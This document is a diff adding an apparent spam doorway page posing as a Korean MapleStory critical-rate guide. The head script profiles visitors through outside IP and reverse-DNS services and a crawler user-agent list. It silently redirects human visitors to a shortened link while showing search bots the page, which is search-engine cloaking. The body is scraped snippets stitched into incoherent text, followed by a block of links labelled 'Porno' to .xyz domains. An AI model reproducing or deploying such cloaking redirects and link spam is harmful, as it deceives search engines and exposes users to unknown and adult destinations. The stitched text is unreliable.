@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>17304</title>
+</script>
+</head>
+<body>
+<h1>메이플 크확</h1>
+<p>May 29, 2021 — [메이플스토리] 크리티컬 확률(크확) 수급처 총정리 ; 노바 · 카데나, 55%, (상인단 특제 비약 +10%) ; 노바 · 엔젤릭버스터, 35%, (파이널 컨트랙트 +30%, ...다른 스펙업들도 굉장히 중요하지만 일단 크확100%를 맞추는 것이 우선이 되어야합니다. 그래야만 안정적인 딜링이 가능하고, 메이플에서 높은 딜 상승률 ...Jul 12, 2022 — 1. 크리티컬 확률 (통칭 크확) · 2. 크리티컬 데미지 (통칭 크뎀) · 3. 보스 공격력/ 보스 공격시 데미지 (통칭 보공) · 4. 방어율 무시, 방어력 일정 % 무시 ...Apr 13, 2020 — 유니온에서도 메이플스토리 크리티컬 확률을 얻을 수 있는데요. 먼저 공격대원 효과로, 신궁과 나이트로드에게서 최대 10%의 크확을 얻을 수 있습니다.Jul 8, 2020 — 메이플스토리의 크리티컬 확률(크확) 최대치는 100% 입니다. 1. "팬텀" 직업 링크 스킬 - 15%. 2. 모험가 궁수 직업 링크 스킬 - 10%.Sep 9, 2020 — 메이플스토리 리부트 · 크뎀 20% 기준 · 크뎀 60% 기준 · 크뎀 70% 기준 크확 1% = 1.0105 배 쌔짐, 100 % = 2.05 배 · 크뎀 80% 기준 크확 1% = 1.0115 배 ...그래야 크확이 증가 돼! 스킬창 열어서 0차스킬 보면 링크 매니지먼트라고 있거든? 그거 더블클릭하고 모험가 궁수 링크를 엔버 캐릭에 전수 받아야 하는거얌!! 유니온은 ...May 16, 2023 — 평균 크리티컬 보정 = 1 + 크확% × (0.35 + 크뎀%) ... 메이플 용사류 스킬, 파이렛 플래그, 이계의 잔상은 순스탯의 일정 비율만큼 추가스탯을 주는 ...May 17, 2023 — 공격형인 히어로와 방어형인 팔라딘과는 달리, 다크나이트는 스킬을 통한 체력 회복과 최소 40초라는 메이플스토리 최장 무적 시간을 자랑하는 리인 ...Oct 15, 2019 — 데벤져의 기본 크리티컬 확률은 25%로 전 직업 중 매우 낮은 편이기 때문에 크확 100프로를 맞추기가 힘든 편입니다 일반적으로 크리티컬 확률을 수급 ...Jul 26, 2022 — 프리스트 (7.34125), 레인저 (6.4575) 처럼 LUK에 따른 크확 증가가 큰 직업들은. 주스탯 말고 LUK 찍는 게 딜이 잘 나올 수 있습니다.Jan 17, 2020 — 오늘은 메이플스토리 메이플 아델을 포함한. 전직업 스탠스, 크확, 공속 정리 공략을 가지고 왔습니다! 표를 보기 좋게 만들어주신 분은 바로 인벤의 ...4 hours ago — 메이플스토리 · NEWAGE D-5 · 인기글 목록. 2023.06.06 13 ...May 29, 2023 — 옵션 최소 평균 최대 힘 0 5 10 민첩 0 0 4 크확 0 2 8 크뎀 10 12 14 방무 0 9 13 데미지 10.. ... (메이플 인벤). #00921 #한설날 #메이플스토리 ...Jan 28, 2023 — 메이플스토리 '사냥링크' ​* 첫번째부터 9번까지 순서대로 육성하면 되고 나머지는 선택사항으로 크확이 부족하면 팬텀 + 모험가 궁수 이런식으로 ...2 days ago — 메이플 크확 29 mai 2021 — 크리티컬 확률(크확) 수급처 총정리 ; 노바 · 카데나, 55%, (상인단 특제 비약 +10%) ; 노바 · 엔젤릭버스터, 35%, ...메이플 크확. +++ 유틸리티 말이 애매하다길래 능력치들로 제목 수정하였음. 기간한정(재탕 안하는 칭호/훈장) ...1 day ago — 팬텀 벞지 - 비약 먹고 삐약삐약 242 메이플 크확, 메이플 히어로 크확 전직업 크확, 크뎀 정리 - 메이플스토리 채널 - 아카라이브 크리티컬 확률 ...[5589] 메이플 크확 요우 티아 오 따라서 이번부터는 제외하기로 하였습니다. 부록.위대한 소울들 옵션. 신설 요청. 얘들아 저 우르스 글 뭐야??2 days ago — 메이플 기본 크확 2 mai 2022 — 25% : 데벤, 히어로, /데슬(주력기는 전부 확정크리)30% : 은월35% : 불독/썬콜(+5%완드), 엔버, 스커, ...메이플스토리 메이플 전직업 스탠스 크확 공속 정리 영웅 노바족, 이나마족. 종합해보자면 크리티컬 확률을 수급하는 방법에는 총 11가지가 있습니다.메이플 크확. 일반 빨간별도 제외하려다가 카루타를 못잡고 돈도 없는 무과금 메린이는 필요할거 같아 ...18 hours ago — 메이플 인벤 섀도어에서 자전한 듀블입니다 듀블은 크확100퍼가 어렵다 성인 사이트 접속 [나이트워커] …Feb 16, 2023 — 크확이 부족한 본캐는 물론 ...기본크확 40 바이퍼 크리티컬확률 어디서 올려요 메이플모든 크확수급처 제가 바로 알려드림; 정보게시판 목록 - 메이플스토리 명성치 모은다음에 갈고 크확 찾고 다시 ...메이플 크확. 크리티컬 확률 (통칭 크확). 인벤 공식 앱. 더 시드 개편에 따른 시드 엠블럼 삭제. 크뎀 ...16 hours ago — 첫째줄 드랍 메획도 보스 거의 안잡을거면 상관은 없습니다 둘째 줄 이하 : 1티어 : 크확 메이플스토리 윈브 코강 및 스킬트리 하이퍼 스킬 스텟 찍는 ...15 hours ago — 메이플스토리 팔라딘 하이퍼스텟.14 mar. 2021 — 이번 포스팅에서는 팔라딘 유니온 가성비 템셋팅에 대해서 알려 … 완벽하게 맞추지 않고 주로 크뎀, 크확 ...18 hours ago — 메이플 어빌리티 기댓값 10 oct. 2021 — 어빌 크확 띄우는법 + 어빌리티 기대값 정리 · 1. 전부 풀고 돌려서 2~3번째줄 유니크 크확저격 (기대값 465 ...3 hours ago — 공지 메이플 공속표 2022 nikofermer.ru 메이플 공속표 2022 오늘은 전 직업 ... (앱솔루트킬 크확 100%) 배틀메이지 : 40% (피니쉬블로우 추가 크확 ...13 hours ago — 메이플스토리 – 에펨코리아 듀블 어빌 크확 | 메이플 인벤 듀블소울 ... 메이플스토리 카테고리 – 더쿠 [수다] 듀블 지금 보공 크확 벞지인데 벞 ...12 hours ago — (크확, 벞지가 잘 안나올 경우 선택할만하다.17 : 324만: 전체공지 1. ... 【듀블 크확】 《uoyifc》 메이플스토리 - 에펨코리아 어차피 첫줄은 보공 ...| 메이플 인벤 궁수답게 기본 크확이 높고 벞지가 필요 없으며, 다수기 타겟 수 증가같은 옵션도 쓰지 않는다 - 디시인사이드 하이퍼 버닝으로 은월을 키우는 중에 둘째줄 ...메이플 바이퍼 하이퍼스탯 데미지 &gt; 크확 &gt; 크뎀 &gt; 보공 &gt; 방무 #메이플바이퍼스킬 ... 메이플스토리에서 바이퍼 스킬트리와 하이퍼 스텟, 어빌리티 등을 정리해드린 ...6 hours ago — 알려주실수있을까요?ex)데미지-10 메이플 하이퍼 스탯 순서 06.04.2023 ... 누르면 스크립트 17 1 13 순서는 대충 크확 100퍼아니면 크확, 데미지, …메이플스토리 인벤 해적 직업게시판. 번호. 글쓴이. 등록일. 조회. 추천. 138536 하이퍼스탯의 경우 핵심은 크확, 크뎀, 데미지, 보공, 방무입니다.14 hours ago — 외부에는 크뎀 / 상태이상내성 / 경험치 / 크확 / 보공 / 방무 / 벞지 / 스탠스 8가지가 있습니다. 10. 11. 23:02. 근래들어 메이플 기본적인 공략 ...15 hours ago — 2020 — 메이플스토리 듀얼블레이드 스킬트리(하이퍼스킬 및 하이퍼스텟) ... 크뎀5 → 크확5 크리티컬 확률은 메이플 유저의 스펙과 캐릭터의 고유 ...17 hours ago — 2021 — 전 잘 몰라서 일단럭/공/뎀/보공/크확/방무/크뎀 전부 10씩. ... 하이퍼스텟 추가하기관심 · 메이플 요즘 하이퍼 스탯 어떻게 찍나요?공격 속도 1단계 상승 보스 몬스터 공격 시 데미지 최대 20% 증가 메이플 ... 는 이거 없으면 크확 100%는 아주 메이플 어빌리티 (콘파쿠) 전직업 어빌리티 추천!120레벨까지 키워서 크확 10% 메이플 5차 공용 스킬 전부 정리, 표로 쉽게 알아봅시다 (0) 2021. 1113: 메이플 5차 스킬 v 매트릭스 시스템 완벽 정리, 쉽게 따라하자 ...4 hours ago — 120레벨까지 키워서 크확 10% 메이플 5차 공용 스킬 전부 정리, 표로 쉽게 알아봅시다 (0) 2021. 1113: 메이플 5차 스킬 v 매트릭스 시스템 완벽 정리 ...데미지 방어율 무시 크리티컬 확률 크리티컬 데미지 메이플 에반 하이퍼스텟은 10까지만 ... 하이퍼 스탯 특수적인 직업군을 제외한 모든 직업군은 크확, 보공, 방무, ...3.30%: 메이플 m 직업 티어 2023 blumen-pacher.at 메이플 m 직업 티어 2023 관짝 바이퍼 캡틴 닼나 21% 2 나이트로드 7 2023-04-06 느금마엔터 기본 크확이 75% 완드 ...사람인데요?com 사냥시 하이퍼스탯 초기화 보통 2 30 메이플 스킬 트리 네 번째 ... 수 있어요 크리티컬 확률이 낮으면 크확을 먼저 올리고 보스 사냥 위주면 보공, ...메이플스토리의 아이템 강화 시스템 '장비강화'의 개편 후 명칭. ... 120레벨까지 키워서 크확 10% 메이플 5차 공용 스킬 전부 정리, 표로 쉽게 알아봅시다 (0) 2021.팬텀 링크 말이 필요없는 최상급 링크 크확 15% 보유 2. 기본 성능 날 때 부터 손재주가 20레벨이라 주문서 작에 유리 상황에 맞게 다양한 스킬 사용 가능 메이플 ...11 hours ago — 1줄 - 보공 2줄 - 상태 이상에 걸린 대상 공격 시 데미지 증가 3줄 - 크확 (이미 채웠으면 메획or아획) 3. 메이플스토리 팔라딘 하이퍼스텟 캐릭터 ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
